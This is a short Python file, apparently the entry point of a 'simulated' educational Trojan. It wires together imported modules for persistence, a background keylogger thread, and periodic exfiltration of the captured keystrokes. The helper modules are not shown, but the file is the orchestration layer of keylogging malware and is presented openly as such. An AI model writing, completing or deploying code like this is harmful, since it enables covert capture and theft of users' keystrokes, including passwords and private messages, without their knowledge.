# trojan.py — main script combining keylogger, exfil, and persistence simulation

import threading
import time
import argparse

from modules import keylogger
from modules import exfil
from modules import autostart

def main():
    parser = argparse.ArgumentParser(description="Simulated Trojan (educational)")
    parser.add_argument("--interval", type=int, default=30, help="Exfil interval in seconds (default: 30)")
    args = parser.parse_args()

    print("[*] Starting simulated Trojan...")

    # 1. Simulate persistence
    autostart.simulate_persistence()

    # 2. Start keylogger in background thread
    keylog_thread = threading.Thread(target=keylogger.start_logging)
    keylog_thread.daemon = True
    keylog_thread.start()

    # 3. (Optional) Periodic exfiltration
    while True:
        try:
            time.sleep(args.interval)
            exfil.send_keylog()
        except KeyboardInterrupt:
            print("[!] Exiting...")
            break

if __name__ == "__main__":
    main()
